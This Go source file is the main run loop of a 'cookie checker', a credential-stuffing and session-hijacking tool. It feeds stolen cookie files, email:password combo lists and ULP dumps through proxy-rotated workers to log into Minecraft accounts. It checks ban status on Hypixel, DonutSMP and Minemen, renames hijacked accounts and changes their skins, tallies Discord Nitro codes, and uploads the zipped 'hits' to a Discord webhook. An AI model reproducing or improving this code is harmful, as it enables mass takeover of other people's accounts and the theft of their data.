package main

import (
	"archive/zip"
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"cookie_checker/auth"
	"cookie_checker/internal/combo"
	"cookie_checker/internal/cookiefile"
	"cookie_checker/internal/donutsmp"
	"cookie_checker/internal/hypixel"
	"cookie_checker/internal/minemen"
	"cookie_checker/internal/proxyutil"
)

// CheckConfig is the shared GUI/CLI configuration for a checker run.
type CheckConfig struct {
	CookiesDir     string `json:"cookiesDir"`
	ComboPath      string `json:"comboPath"`
	ULPPath        string `json:"ulpPath"`
	ProxyFile      string `json:"proxyFile"`
	Workers        int    `json:"workers"`
	TimeoutSec     int    `json:"timeoutSec"`
	DoHypixel      bool   `json:"doHypixel"`
	DoDonut        bool   `json:"doDonut"`
	DoRename       bool   `json:"doRename"`
	SkinFile       string `json:"skinFile"`
	SkinVariant    string `json:"skinVariant"`
	AllFiles       bool   `json:"allFiles"`
	NoCookies      bool   `json:"noCookies"`
	NoCreds        bool   `json:"noCreds"`
	ULPAll         bool   `json:"ulpAll"`
	Relocate       string `json:"relocate"` // copy | move | none
	RunName        string `json:"runName"`
	DiscordWebhook string `json:"discordWebhook"`
	DoUpload       bool   `json:"doUpload"`
}

// CheckStats mirrors the frontend CheckStats shape.
type CheckStats struct {
	Total            int     `json:"total"`
	Processed        int     `json:"processed"`
	Hits             int     `json:"hits"`
	Unbanned         int     `json:"unbanned"`
	Banned           int     `json:"banned"`
	Blocked          int     `json:"blocked"`
	NoMC             int     `json:"noMC"`
	Invalid          int     `json:"invalid"`
	RateLimited      int     `json:"rateLimited"`
	Errors           int     `json:"errors"`
	Renamed          int     `json:"renamed"`
	SkinApplied      int     `json:"skinApplied"`
	Cooldown         int     `json:"cooldown"`
	Nitros           int     `json:"nitros"`
	CPM              float64 `json:"cpm"`
	ElapsedSeconds   int     `json:"elapsedSeconds"`
	DonutUnbanned    int     `json:"donutUnbanned"`
	DonutBanned      int     `json:"donutBanned"`
	DonutNever       int     `json:"donutNever"`
	DonutError       int     `json:"donutError"`
	MinemenUnbanned  int     `json:"minemenUnbanned"`
	MinemenBanned    int     `json:"minemenBanned"`
	MinemenNever     int     `json:"minemenNever"`
	MinemenError     int     `json:"minemenError"`
}

// LiveHit mirrors the frontend LiveHit shape.
type LiveHit struct {
	ID           string `json:"id"`
	Timestamp    string `json:"timestamp"`
	Email        string `json:"email"`
	Username     string `json:"username"`
	NewUsername  string `json:"newUsername"`
	Status       string `json:"status"` // unbanned | banned | blocked | no_mc | invalid
	BanDuration  string `json:"banDuration"`
	RenameStatus string `json:"renameStatus"`
}

// CheckHooks receives progress from a run (GUI events / CLI printing).
type CheckHooks struct {
	OnLog   func(level, message string)
	OnStats func(stats CheckStats)
	OnHit   func(hit LiveHit)
	OnDone  func(stats CheckStats)
	// PrintTerminal enables the existing CLI progress printer.
	PrintTerminal bool
}

func defaultCheckConfig() CheckConfig {
	return CheckConfig{
		CookiesDir:  "cookies",
		ProxyFile:   "proxies.txt",
		Workers:     250,
		TimeoutSec:  25,
		DoHypixel:   true,
		DoDonut:     false,
		DoRename:    true,
		SkinVariant: "classic",
		Relocate:    "copy",
	}
}

func (c CheckConfig) normalized() CheckConfig {
	if c.Workers < 1 {
		c.Workers = 1
	}
	if c.TimeoutSec < 1 {
		c.TimeoutSec = 25
	}
	if strings.TrimSpace(c.CookiesDir) == "" {
		c.CookiesDir = "cookies"
	}
	if strings.TrimSpace(c.ProxyFile) == "" {
		c.ProxyFile = "proxies.txt"
	}
	if strings.TrimSpace(c.SkinVariant) == "" {
		c.SkinVariant = "classic"
	}
	switch c.Relocate {
	case "copy", "move", "none":
	default:
		c.Relocate = "copy"
	}
	c.DiscordWebhook = strings.TrimSpace(c.DiscordWebhook)
	return c
}

func applyCheckConfig(cfg CheckConfig) {
	cfg = cfg.normalized()
	cookiesDir = cfg.CookiesDir
	doHypixel = cfg.DoHypixel
	doRename = cfg.DoRename
	skinFilePath = strings.TrimSpace(cfg.SkinFile)
	skinVariant = cfg.SkinVariant
	relocateMode = cfg.Relocate

	name := strings.TrimSpace(cfg.RunName)
	if name == "" {
		name = time.Now().Format("2006-01-02_15-04-05")
	}
	name = sanitizeRunName(name)
	resultsDir = filepath.Join(resultsRoot, name)
	hitsDir = filepath.Join(resultsDir, "hits")
	hitsBannedDir = filepath.Join(hitsDir, "banned")
	hitsOKDir = filepath.Join(hitsDir, "unbanned")
	hitsNeverDir = filepath.Join(hitsDir, "never_joined")
	hitsHypErrDir = filepath.Join(hitsDir, "hypixel_error")
	hitsDonutUnbannedDir = filepath.Join(hitsDir, "donut_unbanned")
	hitsDonutBannedDir = filepath.Join(hitsDir, "donut_banned")
	hitsMinemenUnbannedDir = filepath.Join(hitsDir, "minemen_unbanned")
	hitsMinemenBannedDir = filepath.Join(hitsDir, "minemen_banned")
	invalidDir = filepath.Join(resultsDir, "invalid")
	noMCDir = filepath.Join(resultsDir, "no_minecraft")
	resultsFile = filepath.Join(resultsDir, "results.txt")
	errorsFile = filepath.Join(resultsDir, "errors.log")
}

func logHook(h CheckHooks, level, msg string) {
	if h.OnLog != nil {
		h.OnLog(level, msg)
	}
}

// runChecker executes one full check pass. Cancel ctx to stop early.
func runChecker(ctx context.Context, cfg CheckConfig, hooks CheckHooks) error {
	cfg = cfg.normalized()
	applyCheckConfig(cfg)
	ensureDirs()
	initErrorLog()
	defer closeErrorLog()

	comboFile := "combo.txt"
	if _, err := os.Stat(comboFile); os.IsNotExist(err) {
		_ = os.WriteFile(comboFile, []byte("# Put your email:pass accounts here, one per line\n"), 0644)
		logHook(hooks, "info", fmt.Sprintf("Autogenerated %s in the main directory.", comboFile))
	}

	useCombo := strings.TrimSpace(cfg.ComboPath) != ""
	useULP := strings.TrimSpace(cfg.ULPPath) != ""
	dirOK := false
	if st, err := os.Stat(cookiesDir); err == nil && st.IsDir() {
		dirOK = true
	}
	useCookies := !cfg.NoCookies && dirOK
	useMainCombo := !cfg.NoCreds

	if !dirOK && !useCombo && !useULP && !useMainCombo {
		return fmt.Errorf("cookie dir not found: %s", cookiesDir)
	}

	logHook(hooks, "info", fmt.Sprintf("run %s | workers=%d", resultsDir, cfg.Workers))

	var pool *proxyutil.Pool
	if _, err := os.Stat(cfg.ProxyFile); err == nil {
		loaded, err := proxyutil.LoadFile(cfg.ProxyFile)
		if err != nil {
			return fmt.Errorf("proxy load failed: %w", err)
		}
		pool = loaded
		logHook(hooks, "info", fmt.Sprintf("proxies %d", pool.Len()))
		if hooks.PrintTerminal {
			fmt.Printf("proxies %d\n", pool.Len())
		}
	} else {
		logHook(hooks, "info", "no proxy file found — running in proxyless (direct) mode")
		if hooks.PrintTerminal {
			fmt.Println("proxyless mode (no proxies.txt)")
		}
	}

	var work []job
	var credParts [][]combo.Cred
	credOpt := combo.LoadOptions{MSOnly: !cfg.ULPAll}

	if useCookies {
		files, err := cookiefile.DiscoverWith(cookiesDir, cookiefile.DiscoverOptions{AllFiles: cfg.AllFiles})
		if err != nil {
			return fmt.Errorf("scan failed: %w", err)
		}
		logHook(hooks, "info", fmt.Sprintf("cookies %d files", len(files)))
		if hooks.PrintTerminal {
			fmt.Printf("cookies %d files\n", len(files))
		}
		for _, f := range files {
			work = append(work, job{kind: "cookie", path: f})
		}
	}
	if useMainCombo {
		creds, err := combo.LoadAnyPath(comboFile, credOpt)
		if err != nil {
			logHook(hooks, "error", fmt.Sprintf("Failed to load %s: %v", comboFile, err))
		} else if len(creds) > 0 {
			logHook(hooks, "info", fmt.Sprintf("combo.txt %d accounts", len(creds)))
			if hooks.PrintTerminal {
				fmt.Printf("combo.txt %d accounts\n", len(creds))
			}
			credParts = append(credParts, creds)
		}
	}
	if useCombo {
		creds, err := combo.LoadAnyPath(cfg.ComboPath, combo.LoadOptions{})
		if err != nil {
			return fmt.Errorf("combo load failed: %w", err)
		}
		logHook(hooks, "info", fmt.Sprintf("combo %d accounts", len(creds)))
		credParts = append(credParts, creds)
	}
	if useULP {
		creds, err := combo.LoadAnyPath(cfg.ULPPath, credOpt)
		if err != nil {
			return fmt.Errorf("ulp load failed: %w", err)
		}
		logHook(hooks, "info", fmt.Sprintf("ulp %d accounts", len(creds)))
		credParts = append(credParts, creds)
	}
	merged := combo.Merge(credParts...)
	for _, c := range merged {
		work = append(work, job{kind: "cred", email: c.Email, password: c.Password, label: c.Source})
	}
	if len(work) == 0 {
		return fmt.Errorf("no accounts/files to check")
	}

	timeout := time.Duration(cfg.TimeoutSec) * time.Second
	clients := auth.NewClientPool(timeout, cfg.Workers)

	logHook(hooks, "info", fmt.Sprintf("checking %d...", len(work)))
	if hooks.PrintTerminal {
		fmt.Printf("checking %d...\n", len(work))
	}

	start := time.Now()
	var (
		done           atomic.Int64
		hitsN          atomic.Int64
		bannedN        atomic.Int64
		blockedN       atomic.Int64
		unbannedN      atomic.Int64
		neverN         atomic.Int64
		hypErrN        atomic.Int64
		noMCN          atomic.Int64
		deadN          atomic.Int64
		rateN          atomic.Int64
		errN           atomic.Int64
		renamedN       atomic.Int64
		skinN          atomic.Int64
		cooldownN      atomic.Int64
		nitrosN        atomic.Int64
		donutUnbannedN  atomic.Int64
		donutBannedN    atomic.Int64
		donutNeverN     atomic.Int64
		donutErrN       atomic.Int64
		minemenUnbannedN atomic.Int64
		minemenBannedN  atomic.Int64
		minemenNeverN   atomic.Int64
		minemenErrN     atomic.Int64
		mu             sync.Mutex
		all            = make([]auth.Result, 0, len(work))
		printMu        sync.Mutex
		comboHitMu     sync.Mutex
		hitSeq         atomic.Int64
		logMu          sync.Mutex
	)

	emitStats := func() {
		if hooks.OnStats == nil {
			return
		}
		n := int(done.Load())
		elapsed := time.Since(start).Seconds()
		cpm := 0.0
		if elapsed > 0 {
			cpm = float64(n) / (elapsed / 60.0)
		}
		hooks.OnStats(CheckStats{
			Total:           len(work),
			Processed:       n,
			Hits:            int(hitsN.Load()),
			Unbanned:        int(unbannedN.Load()),
			Banned:          int(bannedN.Load()),
			Blocked:         int(blockedN.Load()),
			NoMC:            int(noMCN.Load()),
			Invalid:         int(deadN.Load()),
			RateLimited:     int(rateN.Load()),
			Errors:          int(errN.Load()),
			Renamed:         int(renamedN.Load()),
			SkinApplied:     int(skinN.Load()),
			Cooldown:        int(cooldownN.Load()),
			Nitros:          int(nitrosN.Load()),
			CPM:             cpm,
			ElapsedSeconds:  int(elapsed),
			DonutUnbanned:   int(donutUnbannedN.Load()),
			DonutBanned:     int(donutBannedN.Load()),
			DonutNever:      int(donutNeverN.Load()),
			DonutError:      int(donutErrN.Load()),
			MinemenUnbanned: int(minemenUnbannedN.Load()),
			MinemenBanned:   int(minemenBannedN.Load()),
			MinemenNever:    int(minemenNeverN.Load()),
			MinemenError:    int(minemenErrN.Load()),
		})
	}

	emitLine := func(level, line string) {
		if hooks.OnLog == nil {
			return
		}
		logMu.Lock()
		hooks.OnLog(level, line)
		logMu.Unlock()
	}

	// Seed total immediately so the UI progress bar has a denominator.
	if hooks.OnStats != nil {
		hooks.OnStats(CheckStats{Total: len(work)})
	}

	jobs := make(chan job, cfg.Workers*2)
	var wg sync.WaitGroup
	workers := cfg.Workers
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case j, ok := <-jobs:
					if !ok {
						return
					}
					select {
					case <-ctx.Done():
						return
					default:
					}

					var proxyURL *url.URL
					if pool != nil {
						proxyURL = pool.Next()
					}
					client := clients.Client(proxyURL)
					checker := &auth.Checker{Client: client}
					var res auth.Result
					switch j.kind {
					case "cred":
						res = processCred(checker, j.email, j.password, j.label, proxyURL, &comboHitMu)
					default:
						res = processOne(checker, j.path, proxyURL)
					}

					liveStatus := ""
					logLevel := "info"
					switch res.Status {
					case auth.StatusHit:
						hitsN.Add(1)
						if res.NameChanged {
							renamedN.Add(1)
						}
						if res.SkinChanged {
							skinN.Add(1)
						}
						if res.NameChangeErr == "not changeable" {
							cooldownN.Add(1)
						}
						switch res.HypixelStatus {
						case string(hypixel.StatusBanned):
							if isSecurityBlock(res.HypixelReason) {
								blockedN.Add(1)
								liveStatus = "blocked"
								logLevel = "error"
							} else {
								bannedN.Add(1)
								liveStatus = "banned"
								logLevel = "warn"
							}
						case string(hypixel.StatusUnbanned):
							unbannedN.Add(1)
							liveStatus = "unbanned"
							logLevel = "success"
						case string(hypixel.StatusNeverJoined):
							neverN.Add(1)
							liveStatus = "unbanned"
							logLevel = "info"
						case string(hypixel.StatusError):
							hypErrN.Add(1)
							liveStatus = "unbanned"
							logLevel = "warn"
						default:
							liveStatus = "unbanned"
							logLevel = "success"
						}
						// DonutSMP check — always runs on every hit, with its own fresh timeout
						if res.AccessToken != "" && res.Username != "" {
							joinName := res.Username
							if res.NewUsername != "" {
								joinName = res.NewUsername
							}
							var donutProxy *url.URL
							if pool != nil {
								donutProxy = pool.Next()
							}
							// Use a fresh context so a slow Hypixel check doesn't exhaust the deadline
							donutCtx, donutCancel := context.WithTimeout(context.Background(), 30*time.Second)
							dr := donutsmp.Check(donutCtx, res.AccessToken, joinName, res.UUID, donutProxy)
							donutCancel()
							res.DonutStatus = string(dr.Status)
							res.DonutReason = dr.Reason
							switch dr.Status {
							case donutsmp.StatusUnbanned:
								donutUnbannedN.Add(1)
								// Save to donut_unbanned folder
								if j.kind == "cred" {
									writeCredHit(res, hitsDonutUnbannedDir, "donut_unbanned", &comboHitMu)
								} else {
									_ = os.MkdirAll(hitsDonutUnbannedDir, 0o755)
									relocateAs(j.path, hitsDonutUnbannedDir, hitFilename(joinName, "donut_unbanned"))
								}
							case donutsmp.StatusBanned:
								donutBannedN.Add(1)
								// Save to donut_banned folder
								if j.kind == "cred" {
									writeCredHit(res, hitsDonutBannedDir, "donut_banned", &comboHitMu)
								} else {
									_ = os.MkdirAll(hitsDonutBannedDir, 0o755)
									relocateAs(j.path, hitsDonutBannedDir, hitFilename(joinName, "donut_banned"))
								}
							case donutsmp.StatusNeverJoined:
								donutNeverN.Add(1)
							default:
								donutErrN.Add(1)
							}
						if hooks.OnLog != nil {
							logMu.Lock()
							hooks.OnLog(fmt.Sprintf(
								"[DONUT] %s → %s | %s",
								joinName, strings.ToUpper(res.DonutStatus), res.DonutReason,
							), "info")
							logMu.Unlock()
						}
						// ── Minemen Club check ────────────────────────────────────────
						var minemenProxy *url.URL
						if pool != nil {
							minemenProxy = pool.Next()
						}
						minemenCtx, minemenCancel := context.WithTimeout(context.Background(), 30*time.Second)
						mr := minemen.Check(minemenCtx, res.AccessToken, joinName, res.UUID, minemenProxy)
						minemenCancel()
						res.MinemenStatus = string(mr.Status)
						res.MinemenReason = mr.Reason
						switch mr.Status {
						case minemen.StatusUnbanned:
							minemenUnbannedN.Add(1)
							if j.kind == "cred" {
								writeCredHit(res, hitsMinemenUnbannedDir, "minemen_unbanned", &comboHitMu)
							} else {
								_ = os.MkdirAll(hitsMinemenUnbannedDir, 0o755)
								relocateAs(j.path, hitsMinemenUnbannedDir, hitFilename(joinName, "minemen_unbanned"))
							}
						case minemen.StatusBanned:
							minemenBannedN.Add(1)
							if j.kind == "cred" {
								writeCredHit(res, hitsMinemenBannedDir, "minemen_banned", &comboHitMu)
							} else {
								_ = os.MkdirAll(hitsMinemenBannedDir, 0o755)
								relocateAs(j.path, hitsMinemenBannedDir, hitFilename(joinName, "minemen_banned"))
							}
						case minemen.StatusNeverJoined:
							minemenNeverN.Add(1)
						default:
							minemenErrN.Add(1)
						}
						if hooks.OnLog != nil {
							logMu.Lock()
							hooks.OnLog(fmt.Sprintf(
								"[MINEMEN] %s → %s | %s",
								joinName, strings.ToUpper(res.MinemenStatus), res.MinemenReason,
							), "info")
							logMu.Unlock()
						}
					} // end if res.AccessToken != ""
					case auth.StatusNoMinecraft:
						noMCN.Add(1)
						liveStatus = "no_mc"
						logLevel = "info"
					case auth.StatusInvalid:
						deadN.Add(1)
						liveStatus = "invalid"
						logLevel = "error"
					case auth.StatusRateLimited:
						rateN.Add(1)
						liveStatus = "rate_limited"
						logLevel = "warn"
					default:
						errN.Add(1)
						liveStatus = "error"
						logLevel = "error"
					}
					
					if len(res.DiscordCodes) > 0 {
						validNitros := 0
						for _, promo := range res.DiscordCodes {
							if promo.IsValid {
								validNitros++
							}
						}
						if validNitros > 0 {
							nitrosN.Add(int64(validNitros))
						}
					}

					n := done.Add(1)
					line := formatCheckLine(res)
					// Always persist failures to errors.log for combo tuning.
					switch res.Status {
					case auth.StatusInvalid:
						appendErrorLogStatus("INVALID", resultWho(res), orReason(res, "invalid"))
					case auth.StatusRateLimited:
						appendErrorLogStatus("RATE_LIMITED", resultWho(res), orReason(res, "rate limited"))
					case auth.StatusError:
						appendErrorLogStatus("ERROR", resultWho(res), orReason(res, "error"))
					}
					// UI: always show hits / rate-limits / errors / no_mc; sample invalids
					// so high-CPM combo runs don't freeze the frontend.
					showUI := true
					if res.Status == auth.StatusInvalid && n%25 != 0 && n != int64(len(work)) {
						showUI = false
					}
					if showUI {
						emitLine(logLevel, line)
					}

					if hooks.PrintTerminal {
						printMu.Lock()
						printResult(res, n, int64(len(work)), start, &hitsN, &deadN, &noMCN, &errN)
						printMu.Unlock()
					}

					if hooks.OnHit != nil && (liveStatus == "unbanned" || liveStatus == "banned" ||
						liveStatus == "blocked" || liveStatus == "no_mc") {
						seq := hitSeq.Add(1)
						hooks.OnHit(resultToLiveHit(res, liveStatus, seq))
					}
					// Emit stats more often so UI feels live (every result for small runs).
					if n%10 == 0 || n == int64(len(work)) || liveStatus == "rate_limited" {
						emitStats()
					}

					mu.Lock()
					all = append(all, res)
					mu.Unlock()
				}
			}
		}()
	}

feed:
	for _, j := range work {
		select {
		case <-ctx.Done():
			break feed
		case jobs <- j:
		}
	}
	close(jobs)
	wg.Wait()

	emitStats()
	elapsed := time.Since(start)
	writeResults(all)
	cpm := float64(done.Load()) / (elapsed.Seconds() / 60.0)
	final := CheckStats{
		Total:          len(work),
		Processed:      int(done.Load()),
		Hits:           int(hitsN.Load()),
		Unbanned:       int(unbannedN.Load()),
		Banned:         int(bannedN.Load()),
		Blocked:        int(blockedN.Load()),
		NoMC:           int(noMCN.Load()),
		Invalid:        int(deadN.Load()),
		RateLimited:    int(rateN.Load()),
		Errors:         int(errN.Load()),
		Renamed:        int(renamedN.Load()),
		SkinApplied:    int(skinN.Load()),
		Cooldown:       int(cooldownN.Load()),
		Nitros:         int(nitrosN.Load()),
		CPM:            cpm,
		ElapsedSeconds: int(elapsed.Seconds()),
		DonutUnbanned:  int(donutUnbannedN.Load()),
		DonutBanned:    int(donutBannedN.Load()),
		DonutNever:     int(donutNeverN.Load()),
		DonutError:     int(donutErrN.Load()),
	}

	if hooks.PrintTerminal {
		fmt.Printf(
			"\nDone in %s — %s%d hit(s)%s / %d checked (%.0f CPM).\n",
			elapsed.Round(time.Millisecond),
			colorGreen, hitsN.Load(), colorReset,
			done.Load(),
			cpm,
		)
		if doHypixel {
			fmt.Printf("  hypixel: banned=%d  blocked=%d  unbanned=%d  never=%d  error=%d\n",
				bannedN.Load(), blockedN.Load(), unbannedN.Load(), neverN.Load(), hypErrN.Load())
		}
		fmt.Printf("  hits=%d  no_mc=%d  invalid=%d  errors=%d\n",
			hitsN.Load(), noMCN.Load(), deadN.Load(), errN.Load())
		fmt.Printf("  results -> %s\n", resultsDir)
	}

	logHook(hooks, "info", fmt.Sprintf("done: %d hits / %d checked (%.0f CPM) -> %s",
		hitsN.Load(), done.Load(), cpm, resultsDir))

	if cfg.DoUpload && cfg.DiscordWebhook != "" {
		logHook(hooks, "info", "Archiving results folder...")
		zipPath := resultsDir + ".zip"
		if err := zipDir(resultsDir, zipPath); err != nil {
			logHook(hooks, "error", fmt.Sprintf("Failed to zip results: %v", err))
		} else {
			logHook(hooks, "info", "Uploading results zip to Discord...")
			if err := uploadToDiscord(cfg.DiscordWebhook, zipPath); err != nil {
				logHook(hooks, "error", fmt.Sprintf("Discord webhook upload failed: %v", err))
			} else {
				logHook(hooks, "info", "Results successfully uploaded to Discord!")
			}
			_ = os.Remove(zipPath)
		}
	}

	if hooks.OnDone != nil {
		hooks.OnDone(final)
	}
	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}

func formatCheckLine(r auth.Result) string {
	who := resultWho(r)
	switch r.Status {
	case auth.StatusHit:
		ign := safePrint(r.Username)
		if ign == "" || ign == "?" {
			ign = who
		}
		if r.NewUsername != "" {
			ign += " -> " + r.NewUsername
		}
		label := "HIT"
		extra := ""
		switch hypixel.Status(r.HypixelStatus) {
		case hypixel.StatusBanned:
			if isSecurityBlock(r.HypixelReason) {
				label = "BLOCKED"
			} else if r.HypixelBanDuration != "" {
				label = "BANNED | " + r.HypixelBanDuration
			} else {
				label = "BANNED"
			}
			extra = r.HypixelReason
		case hypixel.StatusUnbanned:
			label = "UNBANNED"
		case hypixel.StatusNeverJoined:
			label = "NEVER"
			extra = r.HypixelReason
		case hypixel.StatusError:
			label = "HIT"
			extra = "hypixel_error: " + r.HypixelReason
		}
		
		if len(r.DiscordCodes) > 0 {
			var promos []string
			for _, code := range r.DiscordCodes {
				if code.IsValid {
					promos = append(promos, code.Code+"(valid)")
				} else {
					promos = append(promos, code.Code+"(untested/invalid)")
				}
			}
			promoStr := "nitros: [" + strings.Join(promos, ", ") + "]"
			if extra != "" {
				extra += " | " + promoStr
			} else {
				extra = promoStr
			}
		}

		if extra != "" {
			return fmt.Sprintf("[%s] %s | %s", label, ign, safePrint(extra))
		}
		return fmt.Sprintf("[%s] %s", label, ign)
	case auth.StatusNoMinecraft:
		return fmt.Sprintf("[NO MC] %s | %s", who, safePrint(orReason(r, "no minecraft")))
	case auth.StatusInvalid:
		return fmt.Sprintf("[INVALID] %s | %s", who, safePrint(orReason(r, "invalid")))
	case auth.StatusRateLimited:
		return fmt.Sprintf("[RATE LIMITED] %s | %s", who, safePrint(orReason(r, "rate limited")))
	default:
		return fmt.Sprintf("[ERROR] %s | %s", who, safePrint(orReason(r, "error")))
	}
}

func orReason(r auth.Result, fallback string) string {
	if r.Reason != "" {
		return r.Reason
	}
	return fallback
}

func resultToLiveHit(res auth.Result, status string, seq int64) LiveHit {
	renameStatus := ""
	newName := res.NewUsername
	switch {
	case res.NameChanged && res.SkinChanged:
		renameStatus = fmt.Sprintf("-> %s [name+skin changed]", res.NewUsername)
	case res.NameChanged && res.SkinChangeErr != "":
		renameStatus = fmt.Sprintf("-> %s [name changed, skin ERR]", res.NewUsername)
	case res.NameChanged:
		renameStatus = fmt.Sprintf("-> %s [name changed]", res.NewUsername)
	case res.NameChangeErr == "not changeable":
		renameStatus = "[not changeable]"
	case res.NameChangeErr == "name taken (try again)":
		renameStatus = "[name taken — retry]"
	case res.NameChangeErr != "":
		renameStatus = "[rename ERR]"
	case status == "no_mc":
		renameStatus = "no minecraft"
	case status == "invalid":
		renameStatus = res.Reason
	}

	email := res.Email
	if email == "" {
		email = res.File
	}
	user := res.Username
	if user == "" {
		user = "?"
	}
	return LiveHit{
		ID:           fmt.Sprintf("HIT-%04d", seq),
		Timestamp:    time.Now().Format("15:04:05"),
		Email:        email,
		Username:     user,
		NewUsername:  newName,
		Status:       status,
		BanDuration:  res.HypixelBanDuration,
		RenameStatus: renameStatus,
	}
}

func zipDir(srcDir, destZipPath string) error {
	zipFile, err := os.Create(destZipPath)
	if err != nil {
		return err
	}
	defer zipFile.Close()

	archive := zip.NewWriter(zipFile)
	defer archive.Close()

	err = filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() {
			return nil
		}

		relPath, err := filepath.Rel(srcDir, path)
		if err != nil {
			return err
		}

		// Ensure forward slashes in ZIP headers for compatibility
		relPath = filepath.ToSlash(relPath)

		file, err := os.Open(path)
		if err != nil {
			return err
		}
		defer file.Close()

		writer, err := archive.Create(relPath)
		if err != nil {
			return err
		}

		_, err = io.Copy(writer, file)
		return err
	})

	return err
}

func uploadToDiscord(webhookURL, zipPath string) error {
	file, err := os.Open(zipPath)
	if err != nil {
		return err
	}
	defer file.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("files[0]", filepath.Base(zipPath))
	if err != nil {
		return err
	}

	_, err = io.Copy(part, file)
	if err != nil {
		return err
	}

	// Add optional text content to the message
	err = writer.WriteField("content", fmt.Sprintf("✅ **Cookie Checker Run Complete**\nResults zip for `%s` attached.", filepath.Base(filepath.Dir(zipPath))))
	if err != nil {
		return err
	}

	err = writer.Close()
	if err != nil {
		return err
	}

	req, err := http.NewRequest(http.MethodPost, webhookURL, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord returned status %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}
